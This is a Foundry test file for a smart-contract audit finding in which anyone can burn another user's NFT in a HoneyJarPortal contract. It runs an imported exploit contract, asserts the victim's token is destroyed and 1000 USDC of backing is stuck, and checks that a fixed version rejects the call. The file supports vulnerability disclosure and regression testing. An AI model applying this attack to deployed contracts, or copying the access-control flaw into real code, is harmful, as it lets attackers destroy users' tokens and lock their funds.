// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    HoneyJar,
    HoneyJarPortalFixed,
    PaymentToken
} from "./20610-c-02-anyone-can-burn-any-nft-in-the-honeyjarportal-pashov-no.sol";

contract Finding20610Test is Test {
    function test_anyone_burns_the_jar() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.ownerBefore(), address(0xBEEF), "victim owned the jar");
        assertEq(e.ownerAfter(), address(0), "ownerOf became 0");
        assertEq(e.backingLeft(), 1000 ether, "1000 USDC stuck in the jar");
        assertTrue(e.claimReverted(), "nobody can claim");
        assertEq(e.jar().ownerOf(7), address(0), "ownerOf(7) is 0");
    }

    function test_control_requires_the_owner() public {
        PaymentToken pay = new PaymentToken();
        HoneyJar jar = new HoneyJar();
        HoneyJarPortalFixed portal = new HoneyJarPortalFixed(jar);
        address victim = address(0xBEEF);
        jar.mint(victim, 7);
        jar.setBacking(7, 1000 ether);
        pay.mint(address(jar), 1000 ether);
        (bool ok,) = address(portal).call(
            abi.encodeWithSelector(portal.sendFrom.selector, address(this), uint16(1), abi.encodePacked(address(this)), uint256(7))
        );
        assertTrue(!ok, "stranger cannot burn");
        assertEq(jar.ownerOf(7), victim, "owner unchanged");
        assertEq(pay.balanceOf(address(jar)), 1000 ether, "backing stays claimable by the owner");
    }
}
